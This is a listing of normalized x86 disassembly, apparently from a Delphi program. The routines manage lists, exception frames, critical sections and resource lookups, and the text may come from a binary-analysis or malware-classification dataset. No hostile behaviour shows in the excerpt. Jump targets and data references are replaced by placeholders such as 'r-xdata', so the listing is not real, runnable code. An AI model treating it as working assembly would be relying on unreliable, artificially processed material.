pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418dc4
mov edx ebp
call sub_417b80
test al al
jne r-xdata
sub_417fc0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_417978
mov edx eax
mov eax [ edi + 0x4 ]
call sub_418c68
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418dc4
mov eax [ eax + 0xc ]
mov edx ebp
call sub_418e20
test eax eax
jge r-xdata
sub_41801c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418dc4
mov esi eax
mov edx ebp
mov eax esi
call sub_417bb8
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_4031ec
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418cb4
sub_41806c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_41816b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418172
mov eax [ rw-data ]
call sub_418010
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418c68
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418dc4
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417a94
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418c68
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418dc4
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_418172
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_418198
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4181c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417f58
xor edx edx
push ebp
push sub_41823f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418010
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a64
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418dc4
mov edx [ ebp - 0x4 ]
call sub_417a34
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41825c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4182bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182c3
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_4182c8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_41830e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417dbc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418315
mov eax [ rw-data ]
call sub_418010
retn
sub_41831c
push ebx
push esi
mov esi eax
mov eax esi
call sub_4182c8
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_41825c
sub_41833c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_4183a1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417f7c
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417f64
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183a8
mov eax [ rw-data ]
call sub_418010
retn
mov eax ebx
call sub_403178
mov ebx eax
sub_4183ac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_4183ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41801c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183f5
mov eax [ rw-data ]
call sub_418010
retn
sub_4183f8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_41843a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418441
mov eax [ rw-data ]
call sub_418010
retn
sub_418444
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_41848b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417e90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418492
mov eax [ rw-data ]
call sub_418010
retn
sub_418498
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417f58
xor eax eax
push ebp
push sub_4184e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417c5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184ed
mov eax [ rw-data ]
call sub_418010
retn
sub_41854c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403550
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_418584
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41854c
mov edx eax
mov eax [ rw-data ]
call sub_419100
pop edi
pop esi
pop ebx
retn
sub_4185b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_419188
mov esi eax
xor edx edx
push ebp
push sub_41861a
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax esi
call sub_418dc4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403a64
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41862c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_419188
mov esi eax
xor edx edx
push ebp
push sub_418696
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
mov edx ebx
mov eax esi
call sub_418dc4
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a64
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4186a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407fbc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4186e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403fd0
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41872c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_418e20
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418c68
sub_418784
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418dc4
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4187c4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_418784
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_4187e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_40443c
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bc90
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41885c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b72c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_41886c
push ebx
call sub_405fd0
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405fd0
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418c68
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov ebx eax
call sub_405fd0
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov ebx eax
call sub_405fd0
mov [ eax + 0xc ] ebx
sub_4188c4
push ebx
push esi
push edi
call sub_405fd0
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418dc4
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_4188f4
push ebx
push esi
call sub_405fd0
mov eax [ eax + 0x8 ]
call sub_4031ec
call sub_405fd0
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418eac
mov esi eax
call sub_405fd0
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418cb4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405fd0
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_4031ec
sub_418950
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4189e6
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189ed
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403178
call sub_418950
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40524c
call sub_40529c
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_4187e8
or bl al
sub_4189f8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418aa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418a87
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403134
call sub_418950
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41886c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a8e
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4188c4
retn
call sub_4188f4
sub_418abc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41be14
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418b19
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41ef98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b20
mov eax [ ebp - 0x4 ]
call sub_4031ec
retn
sub_418b28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_403134
push eax
mov eax esi
call sub_403134
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419b1c
push eax
mov eax esi
call sub_419b1c
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418c35
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418abc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418c18
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418abc
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f48
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418c1f
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
mov al 0x1
sub_418c48
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_418c68
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418cb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_402968
mov edx esi
mov eax ebx
call sub_418dc4
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418d18
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418d14
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
jmp sub_4039b8
sub_418d50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418d98
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405d64
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418d18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d9f
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_418dc4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418dec
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418f80
retn
sub_418e20
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_418e40
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_402968
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418eb8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418dc4
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418cb4
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418e40
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_418f10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418f60
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_418e20
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418cb4
sub_418f80
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4027ac
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418fbc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418d50
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418f80
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402bf8
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418cb4
dec ebp
inc edi
jne r-xdata
sub_419030
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_419084
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035b8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419188
xor eax eax
push ebp
push sub_4190e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4031ec
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4031dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190ed
mov eax [ ebp - 0x4 ]
call sub_4191ec
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_419100
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419188
xor eax eax
push ebp
push sub_41917c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418c68
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418e20
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419183
mov eax [ ebp - 0x4 ]
call sub_4191ec
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_418d50
sub_41919c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419188
xor eax eax
push ebp
push sub_4191df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418f60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191e6
mov eax [ ebp - 0x4 ]
call sub_4191ec
retn
sub_4191f8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41924c
mov edx ebx
